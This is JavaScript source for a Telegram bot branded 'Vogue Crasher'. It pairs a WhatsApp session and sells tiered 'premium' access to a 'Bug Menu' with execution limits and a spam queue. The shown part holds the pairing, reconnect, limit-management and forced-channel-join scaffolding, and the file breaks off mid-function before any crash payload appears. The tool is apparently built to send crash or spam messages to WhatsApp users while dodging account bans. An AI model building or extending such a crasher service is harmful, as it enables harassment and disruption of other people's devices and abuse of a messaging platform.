//     _____ _____ _   _ ______ _____ _____ 
//    /  __ \  _  | \ | ||  ___|_   _|  __ \
//    | /  \/ | | |  \| || |_    | | | |  \/
//    | |   | | | | . ` ||  _|   | | | | __ 
//    | \__/\ \_/ / |\  || |    _| |_| |_\ \
//     \____/\___/\_| \_/\_|    \___/ \____/
//                                          
//                                          
//     _   _  ___  ______                   
//    | | | |/ _ \ | ___ \                  
//    | | | / /_\ \| |_/ /                  
//    | | | |  _  ||    /                   
//    \ \_/ / | | || |\ \                   
//     \___/\_| |_/\_| \_|                  
//                                          
//                                          
//     _____ _____ _   _______ ___________  
//    /  ___|  ___| \ | |  _  \  ___| ___ \ 
//    \ `--.| |__ |  \| | | | | |__ | |_/ / 
//     `--. \  __|| . ` | | | |  __||    /  
//    /\__/ / |___| |\  | |/ /| |___| |\ \  
//    \____/\____/\_| \_/___/ \____/\_| \_| 
//                                          
//                                          

const { Telegraf } = require("telegraf");
const { spawn } = require('child_process')
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const FormData = require("form-data");
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm')
const os = require('os')
const waapi =require('@api/waapi');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    generateWAMessageContent,
    generateWAMessage,
    prepareWAMessageMedia,
    fetchLatestBaileysVersion,
    generateWAMessageFromContent,
    DisconnectReason,
    BufferJSON,
} = require('@bellachu/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
    const ev = new EventEmitter()
    
    let chats = {}
    let messages = {}
    let contacts = {}
    
    ev.on('messages.upsert', ({ messages: newMessages, type }) => {
        for (const msg of newMessages) {
            const chatId = msg.key.remoteJid
            if (!messages[chatId]) messages[chatId] = []
            messages[chatId].push(msg)
            
            if (messages[chatId].length > 100) {
                messages[chatId].shift()
            }
            
            chats[chatId] = {
                ...(chats[chatId] || {}),
                id: chatId,
                name: msg.pushName,
                lastMsgTimestamp: +msg.messageTimestamp
            }
        }
    })
    
    ev.on('chats.set', ({ chats: newChats }) => {
        for (const chat of newChats) {
            chats[chat.id] = chat
        }
    })
    
    ev.on('contacts.set', ({ contacts: newContacts }) => {
        for (const id in newContacts) {
            contacts[id] = newContacts[id]
        }
    })
    
    return {
        chats,
        messages,
        contacts,
        bind: (evTarget) => {
            evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
            evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
            evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
        },
        logger
    }
}
const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});
const thumbnailUrl = "https://files.catbox.moe/eyhahn.png";
const bot = new Telegraf(tokenBot);
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;
const lastClaim = new Map();
const messageLog = new Map();
let restarting = false;
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
const requiredChannel = "@VogueOfficialx";
const premiumFile = './database/premium.json';
const premiumGroupFile = './database/premiumgroup.json';
const claimFile = './database/premium_claimed.json';
const activeAnimatedMenus = new Map();
const lockedMenus = new Set();
const styleCycle = ["primary", "success", "danger"];
let currentStyleIndex = 0;
let reconnecting = false;
let pingInterval = null;
let reconnectTimeout = null;
let socketStarted = false;
const cooldown = new Map();
let globalCooldown = 0;
let spamQueue = [];
let queueRunning = false;
const queueFile = "./database/spamQueue.json";
const LOG_QUEUE_CHANNEL_ID = "@LogVagues";
const TASK_DURATION =
    (30 * 3000) + (3 * 60 * 1000);

const loadClaimed = () => {
    try {
        return JSON.parse(fs.readFileSync(claimFile));
    } catch {
        return {};
    }
};

const saveClaimed = (data) => {
    fs.writeFileSync(claimFile, JSON.stringify(data, null, 2));
};

const hasClaimedFreePremium = (userId) => {
    const data = loadClaimed();
    return !!data[userId];
};

const markClaimedFreePremium = (userId) => {
    const data = loadClaimed();
    data[userId] = true;
    saveClaimed(data);
};

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

if (!fs.existsSync(premiumGroupFile)) {
    fs.writeFileSync(
        premiumGroupFile,
        JSON.stringify([], null, 2)
    );
}

function loadPremiumGroups() {
    return JSON.parse(
        fs.readFileSync(premiumGroupFile)
    );
}

function savePremiumGroups(data) {
    fs.writeFileSync(
        premiumGroupFile,
        JSON.stringify(data, null, 2)
    );
}

function isPremiumGroup(chatId) {
    const groups = loadPremiumGroups();
    return groups.includes(chatId.toString());
}

function checkPremiumAccess(ctx, next) {
    
    const userId = ctx.from.id.toString();
    const chatId = ctx.chat.id.toString();
    
    const premiumUsers = loadPremiumUsers();
    
    const userPremium =
        premiumUsers[userId];
    
    const groupPremium =
        isPremiumGroup(chatId);
    
    if (userPremium || groupPremium) {
        return next();
    }
    
    return ctx.reply(
        `Access Denied

This feature is restricted to premium users or premium groups.`
    );
}

//     _____  _____ _____  _   __ _____ _____                
//    /  ___||  _  /  __ \| | / /|  ___|_   _|               
//    \ `--. | | | | /  \/| |/ / | |__   | |                 
//     `--. \| | | | |    |    \ |  __|  | |                 
//    /\__/ /\ \_/ / \__/\| |\  \| |___  | |                 
//    \____/  \___/ \____/\_| \_/\____/  \_/                 
//                                                           
//                                                           
//     _____ _____ ___  ______ _____ _     _____ _______   __
//    /  ___|_   _/ _ \ | ___ \_   _| |   |_   _|_   _\ \ / /
//    \ `--.  | |/ /_\ \| |_/ / | | | |     | |   | |  \ V / 
//     `--. \ | ||  _  || ___ \ | | | |     | |   | |   \ /  
//    /\__/ / | || | | || |_/ /_| |_| |_____| |_  | |   | |  
//    \____/  \_/\_| |_/\____/ \___/\_____/\___/  \_/   \_/  
//                                                           
//                                                           
//     _______   _______ _____ ________  ___                 
//    /  ___\ \ / /  ___|_   _|  ___|  \/  |                 
//    \ `--. \ V /\ `--.  | | | |__ | .  . |                 
//     `--. \ \ /  `--. \ | | |  __|| |\/| |                 
//    /\__/ / | | /\__/ / | | | |___| |  | |                 
//    \____/  \_/ \____/  \_/ \____/\_|  |_/                 
//                                                           
//                                                           

function clearSocketIntervals() {
    
    if (pingInterval) {
        clearInterval(pingInterval);
        pingInterval = null;
    }
    
    if (reconnectTimeout) {
        clearTimeout(reconnectTimeout);
        reconnectTimeout = null;
    }
}

async function destroySocket() {
    
    try {
        
        clearSocketIntervals();
        
        if (sock?.ws) {
            try {
                sock.ws.close();
            } catch {}
        }
        
        try {
            sock.end();
        } catch {}
        
        try {
            sock.ev.removeAllListeners();
        } catch {}
        
    } catch (e) {}
}

const startSesi = async () => {
    console.clear();
    console.log(chalk.bold.yellow(`
⠈⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠳⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⡴⢧⣀⠀⠀⣀⣠⠤⠤⠤⠤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⠏⢀⡴⠊⠁⠀⠀⠀⠀⠀⠀⠈⠙⠦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢶⣶⣒⣶⠦⣤⣀⠀
⠀⠀⠀⠀⠀⠀⢀⣰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣟⠲⡌⠙⢦⠈⢧
⠀⠀⠀⣠⢴⡾⢟⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡴⢃⡠⠋⣠⠋
⠐⠀⠞⣱⠋⢰⠁⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⠤⢖⣋⡥⢖⣫⠔⠋
⠈⠠⡀⠹⢤⣈⣙⠚⠶⠤⠤⠤⠴⠶⣒⣒⣚⣩⠭⢵⣒⣻⠭⢖⠏⠁⢀⣀
⠠⠀⠈⠓⠒⠦⠭⠭⠭⣭⠭⠭⠭⠭⠿⠓⠒⠛⠉⠉⠀⠀⣠⠏⠀⠀⠘⠞
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠓⢤⣀⠀⠀⠀⠀⠀⠀⣀⡤⠞⠁⠀⣰⣆⠀
⠀⠀⠀⠀⠀⠘⠿⠀⠀⠀⠀⠀⠈⠉⠙⠒⠒⠛⠉⠁⠀⠀⠀⠉⢳⡞⠉⠀⠀⠀⠀⠀


» Information:
  Developer: Prince
  Version: 1.2 Stable
  Status: Bot Connected
  `))
    
    const store = makeInMemoryStore({
        logger: require('pino')().child({ level: 'silent', stream: 'store' })
    })
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();
    
    const connectionOptions = {
        version,
        keepAliveIntervalMs: 10000,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 60000,
        syncFullHistory: false,
        markOnlineOnConnect: true,
        fireInitQueries: false,
        generateHighQualityLinkPreview: false,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: [
            'Ubuntu',
            'Chrome',
            '22.04.4'
        ]
    };
    sock = makeWASocket(connectionOptions);
    
    // ========================================
    // ANTI TIMEOUT HEARTBEAT
    // ========================================
    
    clearSocketIntervals();
    
    pingInterval = setInterval(() => {
        
        try {
            
            if (
                sock &&
                sock.ws &&
                sock.ws.readyState === 1
            ) {
                
                sock.ws.send(
                    JSON.stringify({
                        type: "ping"
                    })
                );
                
                console.log(
                    "[VOGUE] Heartbeat Ping"
                );
            }
            
        } catch {}
        
    }, 15000);
    
    sock.ev.on("messages.upsert", async ({ messages }) => {
        
        const msg = messages[0];
        
        if (!msg.message) return;
        
        const sender = msg.key.remoteJid;
        
        messageLog.set(sender, {
            id: msg.key.id,
            sender: sender,
            pushName: msg.pushName || "Unknown",
            text: msg.message.conversation ||
                msg.message.extendedTextMessage?.text ||
                "[MEDIA/OTHER]",
            timestamp: msg.messageTimestamp,
            type: Object.keys(msg.message)[0]
        });
        
    });
  
    
    
    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
            reconnecting = false;
            socketStarted = true;
            clearSocketIntervals();
            if (lastPairingMessage) {
                const connectedMenu = `
\`\`\`ruby
VOGUE CRASH • PAIRING SYSTEM
────────────────────────────

Session Information

Client Name   : Vogue Crasher
Developer     : @PrinceXVogue
Version       : 1.0
Prefix        : /

────────────────────────────

Registered Number :
${lastPairingMessage.phoneNumber}

Pairing Code :
${lastPairingMessage.pairingCode}

Connection Status Connected and Operational

──────────────────────────────
The sender session has been successfully initialized and is ready for use.
\`\`\``;
                
                try {
                    bot.telegram.editMessageCaption(
                        lastPairingMessage.chatId,
                        lastPairingMessage.messageId,
                        undefined,
                        connectedMenu, { parse_mode: "markdown" }
                    );
                } catch (e) {}
            }
            
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
▒█░░▒█ ▒█▀▀▀█ ▒█▀▀█ ▒█░▒█ ▒█▀▀▀ 
░▒█▒█░ ▒█░░▒█ ▒█░▄▄ ▒█░▒█ ▒█▀▀▀ 
░░▀▄▀░ ▒█▄▄▄█ ▒█▄▄█ ░▀▄▄▀ ▒█▄▄▄ 

▒█▀▀█ ▒█▀▀█ ░█▀▀█ ▒█▀▀▀█ ▒█░▒█ ▒█▀▀▀ ▒█▀▀█ 
▒█░░░ ▒█▄▄▀ ▒█▄▄█ ░▀▀▀▄▄ ▒█▀▀█ ▒█▀▀▀ ▒█▄▄▀ 
▒█▄▄█ ▒█░▒█ ▒█░▒█ ▒█▄▄▄█ ▒█░▒█ ▒█▄▄▄ ▒█░▒█
» Information:
  Developer: Prince
  Version: 1.2 Stable
  Status: Sender Connected
  `))
            pingInterval = setInterval(() => {
                try {
                    
                    if (
                        sock &&
                        sock.ws &&
                        sock.ws.readyState === 1
                    ) {
                        
                        sock.sendPresenceUpdate("available");
                        
                        console.log(
                            "[VOGUE] Presence KeepAlive"
                        );
                    }
                    
                } catch {}
                
            }, 20000);
        }
        
        if (connection === 'close') {
            
            isWhatsAppConnected = false;
            
            const statusCode =
                lastDisconnect?.error?.output?.statusCode;
            
            const shouldReconnect =
                statusCode !== DisconnectReason.loggedOut;
            
            console.log(
                chalk.red(`
        [VOGUE SOCKET CLOSED]
        
        Status Code : ${statusCode}
        Reconnect   : ${shouldReconnect}
        `)
            );
            
            if (!shouldReconnect) {
                
                console.log(
                    chalk.red(
                        "Session logged out."
                    )
                );
                
                return;
            }
            
            // ========================================
            // ANTI MULTIPLE RECONNECT
            // ========================================
            
            if (reconnecting) return;
            
            reconnecting = true;
            
            reconnectTimeout = setTimeout(async () => {
                
                try {
                    
                    console.log(`
        [VOGUE RECONNECT]
        
        Destroying old socket...
        `);
                    
                    await destroySocket();
                    
                    console.log(`
        [VOGUE RECONNECT]
        
        Starting fresh session...
        `);
                    
                    reconnecting = false;
                    
                    startSesi();
                    
                } catch (err) {
                    
                    reconnecting = false;
                    
                    console.log(
                        `[RECONNECT ERROR] ${err.message}`
                    );
                }
                
            }, 5000);
        }
    });
};

process.on(
    "uncaughtException",
    async (err) => {
        
        const msg =
            err?.message || String(err);
        
        console.log(
            `[!] Error Strike: ${msg}`
        );
        
        const shouldRestart =
            msg.includes("Connection Closed") ||
            msg.includes("Timed Out") ||
            msg.includes("Connection Failure") ||
            msg.includes("Stream Errored") ||
            msg.includes("Precondition Required");
        
        if (!shouldRestart) return;
        
        console.log(
            "[VOGUE] Restart Triggered"
        );
        
        try {
            
            await destroySocket();
            
        } catch {}
        
        setTimeout(() => {
            process.exit(1);
        }, 2000);
    }
);

process.on(
    "unhandledRejection",
    async (err) => {
        
        const msg =
            err?.message || String(err);
        
        console.log(
            `[!] Error Strike: ${msg}`
        );
        
        const shouldRestart =
            msg.includes("Connection Closed") ||
            msg.includes("Timed Out") ||
            msg.includes("Connection Failure") ||
            msg.includes("Stream Errored") ||
            msg.includes("Precondition Required");
        
        if (!shouldRestart) return;
        
        console.log(
            "[VOGUE] Restart Triggered"
        );
        
        try {
            
            await destroySocket();
            
        } catch {}
        
        setTimeout(() => {
            process.exit(1);
        }, 2000);
    }
);

startSesi();

restoreQueue();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

//     _____  _   _   ___   _   _  _   _  _____ _     
//    /  __ \| | | | / _ \ | \ | || \ | ||  ___| |    
//    | /  \/| |_| |/ /_\ \|  \| ||  \| || |__ | |    
//    | |    |  _  ||  _  || . ` || . ` ||  __|| |    
//    | \__/\| | | || | | || |\  || |\  || |___| |____
//     \____/\_| |_/\_| |_/\_| \_/\_| \_/\____/\_____/
//                                                    
//                                                    
//     _______   _______ _____ ________  ___          
//    /  ___\ \ / /  ___|_   _|  ___|  \/  |          
//    \ `--. \ V /\ `--.  | | | |__ | .  . |          
//     `--. \ \ /  `--. \ | | |  __|| |\/| |          
//    /\__/ / | | /\__/ / | | | |___| |  | |          
//    \____/  \_/ \____/  \_/ \____/\_|  |_/          
//                                                    
//                                                    

const REQUIRED_CHANNELS = [
    "@VogueOfficialx"
];

async function checkChannelMembership(ctx) {
    
    try {
        
        const notJoined = [];
        
        for (const channel of REQUIRED_CHANNELS) {
            
            try {
                
                const member =
                    await ctx.telegram.getChatMember(
                        channel,
                        ctx.from.id
                    );
                
                const status = member.status;
                
                const allowed = [
                    "creator",
                    "administrator",
                    "member"
                ];
                
                if (!allowed.includes(status)) {
                    notJoined.push(channel);
                }
                
            } catch {
                
                notJoined.push(channel);
            }
        }
        
        if (notJoined.length > 0) {
            
            const buttons = [];
            
            // CHANNEL BUTTONS
            for (const channel of REQUIRED_CHANNELS) {
                
                buttons.push([
                {
                    text: `Join ${channel}`,
                    url: `https://t.me/${channel.replace("@", "")}`
                }]);
            }
            
            // CHECK BUTTON
            buttons.push([
            {
                text: "I've Joined",
                callback_data: "recheck_join"
            }]);
            
            await ctx.replyWithPhoto(
                thumbnailUrl,
                {
                    caption: `\`\`\`ruby
V O G U E  •  V E R I F I C A T I O N
──────────────────────────

Access Denied

Before using this bot,
you must join all required
Telegram channels first.

Required Channels:

${REQUIRED_CHANNELS.join("\n")}

──────────────────────────
After joining all channels,
press the verification button below.
\`\`\``,
                    parse_mode: "markdown",
                    
                    reply_markup: {
                        inline_keyboard: buttons
                    }
                }
            );
            
            return false;
        }
        
        return true;
        
    } catch (err) {
        
        console.log(
            `[JOIN CHECK ERROR] ${err.message}`
        );
        
        return false;
    }
}

bot.use(async (ctx, next) => {
    
    if (ctx.from?.id == ownerID) {
        return next();
    }
    
    if (!ctx.from) {
        return;
    }
    
    const allowed =
        await checkChannelMembership(ctx);
    
    if (!allowed) {
        return;
    }
    
    return next();
});

bot.action(
    "recheck_join",
    async (ctx) => {
        
        const allowed =
            await checkChannelMembership(ctx);
        
        if (allowed) {
            
            await ctx.answerCbQuery(
                "Verification successful"
            );
            
            try {
                
                await ctx.deleteMessage();
                
            } catch {}
            
            return ctx.reply(
                `Access Granted

You can now use the bot normally.`
            );
        }
        
        return ctx.answerCbQuery(
            "You have not joined all channels yet",
            {
                show_alert: true
            }
        );
    }
);

//     _     ________  ________ _____ 
//    | |   |_   _|  \/  |_   _|_   _|
//    | |     | | | .  . | | |   | |  
//    | |     | | | |\/| | | |   | |  
//    | |_____| |_| |  | |_| |_  | |  
//    \_____/\___/\_|  |_/\___/  \_/  
//                                    
//                                    
//     _   _ _____ ___________        
//    | | | /  ___|  ___| ___ \       
//    | | | \ `--.| |__ | |_/ /       
//    | | | |`--. \  __||    /        
//    | |_| /\__/ / |___| |\ \        
//     \___/\____/\____/\_| \_|       
//                                    
//                                    

const LIMIT_FILE =
    "./database/userlimit.json";

let userLimits = {};

if (fs.existsSync(LIMIT_FILE)) {
    
    userLimits =
        JSON.parse(
            fs.readFileSync(
                LIMIT_FILE
            )
        );
}

function saveLimits() {
    
    fs.writeFileSync(
        LIMIT_FILE,
        JSON.stringify(
            userLimits,
            null,
            2
        )
    );
}

function getToday() {
    
    return new Date()
        .toISOString()
        .split("T")[0];
}

function checkUserLimit(userId) {
    
    const today = getToday();
    
    if (!userLimits[userId]) {
        
        userLimits[userId] = {
            
            date: today,
            
            used: 0,
            
            bonus: 0
        };
    }
    
    // RESET HARIAN
    if (
        userLimits[userId].date !== today
    ) {
        
        userLimits[userId] = {
            
            date: today,
            
            used: 0,
            
            bonus: userLimits[userId]
                ?.bonus || 0
        };
    }
    
    // TOTAL LIMIT
    const maxLimit =
        15 +
        (
            userLimits[userId]
            .bonus || 0
        );
    
    // LIMIT HABIS
    if (
        userLimits[userId].used >=
        maxLimit
    ) {
        
        return {
            
            allowed: false,
            
            remaining: 0,
            
            used: userLimits[userId]
                .used,
            
            total: maxLimit
        };
    }
    
    return {
        
        allowed: true,
        
        remaining: maxLimit -
            userLimits[userId]
            .used,
        
        used: userLimits[userId]
            .used,
        
        total: maxLimit
    };
}

function addUserLimit(userId) {
    
    const today = getToday();
    
    if (!userLimits[userId]) {
        
        userLimits[userId] = {
            
            date: today,
            
            used: 0,
            
            bonus: 0
        };
    }
    
    // RESET HARIAN
    if (
        userLimits[userId].date !== today
    ) {
        
        userLimits[userId] = {
            
            date: today,
            
            used: 0,
            
            bonus: userLimits[userId]
                ?.bonus || 0
        };
    }
    
    userLimits[userId].used += 1;
    
    saveLimits();
}

function addBonusLimit(userId, amount) {
    
    const today = getToday();
    
    if (!userLimits[userId]) {
        
        userLimits[userId] = {
            
            date: today,
            
            used: 0,
            
            bonus: 0
        };
    }
    
    if (
        !userLimits[userId].bonus
    ) {
        
        userLimits[userId].bonus = 0;
    }
    
    userLimits[userId].bonus += amount;
    
    saveLimits();
}

function removeBonusLimit(userId, amount) {
    
    if (!userLimits[userId]) {
        return false;
    }
    
    if (
        !userLimits[userId].bonus
    ) {
        
        userLimits[userId].bonus = 0;
    }
    
    userLimits[userId].bonus -= amount;
    
    if (
        userLimits[userId].bonus < 0
    ) {
        
        userLimits[userId].bonus = 0;
    }
    
    saveLimits();
    
    return true;
}

async function checkExecutionLimit(ctx, next) {
    
    if (ctx.from.id == ownerID) {
        return next();
    }
    
    const userId =
        String(ctx.from.id);
    
    const limit =
        checkUserLimit(userId);
    
    if (!limit.allowed) {
        
        return ctx.replyWithPhoto(
            thumbnailUrl,
            {
                caption: `\`\`\`javascript
V O G U E  •  C R A S H E R
──────────────────────────

Daily execution limit reached.

User        : ${ctx.from.first_name}
Limit       : ${limit.used} / ${limit.total}
Status      : Blocked

──────────────────────────
Limit will reset automatically tomorrow.
To avoid sender overload and ban risk.
\`\`\``,
                parse_mode: "markdown",
                
                reply_markup: {
                    inline_keyboard: [
                        [
                        {
                            text: "Developer",
                            url: "https://t.me/ScriptKits",
                            style: "danger"
                        }]
                    ]
                }
            }
        );
    }
    
    addUserLimit(userId);
    
    return next();
}

bot.command("addlimit", async (ctx) => {
    
    try {
        
        if (ctx.from.id != ownerID) {
            return ctx.reply("Owner only.");
        }
        
        const args = ctx.message.text.split(" ");
        
        let targetUserId;
        let targetName;
        let amount;
        
        if (ctx.message.reply_to_message) {
            
            targetUserId = String(
                ctx.message.reply_to_message.from.id
            );
            
            targetName =
                ctx.message.reply_to_message.from.first_name;
            
            amount = parseInt(args[1]);
            
        }
        
        else {
            
            if (!args[1] || !args[2]) {
                
                return ctx.reply(
                    `Usage:
/addlimit <id> <amount>

/addlimit 123456789 10

Or reply user:
/addlimit 10`
                );
            }
            
            targetUserId =
                args[1].replace("@", "");
            
            targetName = args[1];
            
            amount = parseInt(args[2]);
        }
        
        
        if (!amount || amount < 1) {
            return ctx.reply(
                "Invalid limit amount."
            );
        }
        
        addBonusLimit(
            targetUserId,
            amount
        );
        
        const data = checkUserLimit(
            targetUserId
        );
        
        return ctx.replyWithPhoto(
            thumbnailUrl,
            {
                caption: `
\`\`\`ruby
V O G U E • LIMIT MANAGER
────────────────────────

Status
Success

Target
${targetName}

User ID
${targetUserId}

Added Bonus
+${amount}

Current Limit
${data.used} / ${data.total}

────────────────────────
User limit updated successfully.
\`\`\`
`,
                parse_mode: "markdown"
            }
        );
        
    } catch (err) {
        
        console.log(err);
        
        return ctx.reply(
            "Failed to add limit."
        );
    }
});

bot.command("remlimit", async (ctx) => {
    
    try {
        
        if (ctx.from.id != ownerID) {
            return ctx.reply("Owner only.");
        }
        
        const args = ctx.message.text.split(" ");
        
        let targetUserId;
        let targetName;
        let amount;
        
        if (ctx.message.reply_to_message) {
            
            targetUserId = String(
                ctx.message.reply_to_message.from.id
            );
            
            targetName =
                ctx.message.reply_to_message.from.first_name;
            
            amount = parseInt(args[1]);
            
        }
        
        else {
            
            if (!args[1] || !args[2]) {
                
                return ctx.reply(
                    `Usage:
/remlimit <id> <amount>`
                );
            }
            
            targetUserId =
                args[1].replace("@", "");
            
            targetName = args[1];
            
            amount = parseInt(args[2]);
        }
        
        if (!amount || amount < 1) {
            return ctx.reply(
                "Invalid amount."
            );
        }
        
        const removed =
            removeBonusLimit(
                targetUserId,
                amount
            );
        
        if (!removed) {
            return ctx.reply(
                "User not found."
            );
        }
        
        const data = checkUserLimit(
            targetUserId
        );
        
        return ctx.replyWithPhoto(
            thumbnailUrl,
            {
                caption: `
\`\`\`ruby
V O G U E • LIMIT MANAGER
────────────────────────

Status
Success

Target
${targetName}

Removed Bonus
-${amount}

Current Limit
${data.used} / ${data.total}

────────────────────────
User bonus limit updated.
\`\`\`
`,
                parse_mode: "markdown"
            }
        );
        
    } catch (err) {
        
        console.log(err);
        
        return ctx.reply(
            "Failed to remove limit."
        );
    }
});

bot.command("checklimit", async (ctx) => {
    
    try {
        
        const args =
            ctx.message.text.split(" ");
        
        let targetUserId;
        let targetName;
        
        if (ctx.message.reply_to_message) {
            
            targetUserId = String(
                ctx.message.reply_to_message.from.id
            );
            
            targetName =
                ctx.message.reply_to_message.from.first_name;
        }
        
        else if (!args[1]) {
            
            targetUserId =
                String(ctx.from.id);
            
            targetName =
                ctx.from.first_name;
        }
        
        else {
            
            targetUserId =
                args[1].replace("@", "");
            
            targetName = args[1];
        }
        
        const data = checkUserLimit(
            targetUserId
        );
        
        return ctx.replyWithPhoto(
            thumbnailUrl,
            {
                caption: `
\`\`\`ruby
V O G U E • LIMIT CHECKER
────────────────────────

Target
${targetName}

User ID
${targetUserId}

Used
${data.used}

Remaining
${data.remaining}

Total
${data.total}

────────────────────────
Daily limit information.
\`\`\``,
                parse_mode: "markdown"
            }
        );
        
    } catch (err) {
        
        console.log(err);
        
        return ctx.reply(
            "Failed to check limit."
        );
    }
});

//     _____ _____ ___  ______ _____ 
//    /  ___|_   _/ _ \ | ___ \_   _|
//    \ `--.  | |/ /_\ \| |_/ / | |  
//     `--. \ | ||  _  ||    /  | |  
//    /\__/ / | || | | || |\ \  | |  
//    \____/  \_/\_| |_/\_| \_| \_/  
//                                   
//                                   
//    ______  _____ _____            
//    | ___ \|  _  |_   _|           
//    | |_/ /| | | | | |             
//    | ___ \| | | | | |             
//    | |_/ /\ \_/ / | |             
//    \____/  \___/  \_/             
//                                   
//                                   

bot.start(async (ctx) => {
    
    const menuMessage = `
\`\`\`ruby
V O G U E  •  C R A S H E R
──────────────────────────

System Information

User        : ${ctx.from.first_name}
Developer   : @PrinceXVogue
Version     : 1.2 Stable
Prefix      : /
Framework   : Javascript

──────────────────────────
\`\`\``;
    
    const keyboard = [
        [
            { text: "All Menu", callback_data: "/controls" },
            { text: "Bug Menu", callback_data: "/bug" }
        ],
        [
            { text: "Developer", callback_data: "/tqto" }
        ],
        [
            { text: "Free Premium", callback_data: "free_premium_info" }
        ]
    ];
    
    const sent = await ctx.replyWithPhoto(thumbnailUrl, {
        caption: menuMessage,
        parse_mode: "markdown",
        reply_markup: {
            inline_keyboard: keyboard
        }
    });
    
});

bot.action('/start', async (ctx) => {
    
    const menuMessage = `
\`\`\`ruby
V O G U E  •  C R A S H E R
──────────────────────────

System Information

User        : ${ctx.from.first_name}
Developer   : @PrinceXVogue
Version     : 1.2 Stable
Prefix      : /

Description

This Telegram automation system is connected with WhatsApp session integration and advanced function execution modules.

All operations are monitored and executed through the central dispatch system.

──────────────────────────

Select one of the available options below to continue system interaction.
\`\`\``;
    
    const keyboard = [
        [ 
            { text: "Tools Menu", callback_data: "/controls" },
            { text: "Bug Menu", callback_data: "/bug" }
        ],
        [
            {
                text: "Developer",
                callback_data: "/tqto"
            }
        ],
        [
            {
                text: "Free Premium",
                callback_data: "free_premium_info"
            }
        ]
    ];
    
    try {
        
        const sent = await ctx.editMessageMedia(
        {
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "markdown",
            message_effect_id: "5104841245755180586",
        },
        {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
        
        
    } catch (error) {
        
        if (
            error.response &&
            error.response.error_code === 400 &&
            error.response.description ===
            "Bad Request: message is not modified"
        ) {
            
            await ctx.answerCbQuery();
            
        } else {
            
            console.log(
                `[START ERROR] ${error.message}`
            );
        }
    }
});

bot.action('free_premium_info', async (ctx) => {
    
    return ctx.editMessageCaption(
        `\`\`\`ruby
V O G U E  •  C R A S H E R
──────────────────────────

FREE PREMIUM ACCESS

Reward      : 1 Day Premium
Condition   : Join Channel Required

──────────────────────────

You must join our channel to claim premium access.

After joining, press CHECK button.
\`\`\``,
        {
            parse_mode: "markdown",
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "Join Channel", url: `https://t.me/${requiredChannel.replace('@','')}` },
                         { text: "Check Join", callback_data: "check_premium_join" }
                    ],
                    [
                       { text: "Back", callback_data: "/start" }
                    ]
                ]
            }
        }
    );
});

bot.action('check_premium_join', async (ctx) => {
    
    const userId = ctx.from?.id;
    
    if (!userId) {
        return ctx.answerCbQuery("Invalid user context", { show_alert: true });
    }
    
    if (hasClaimedFreePremium(userId)) {
        return ctx.answerCbQuery(
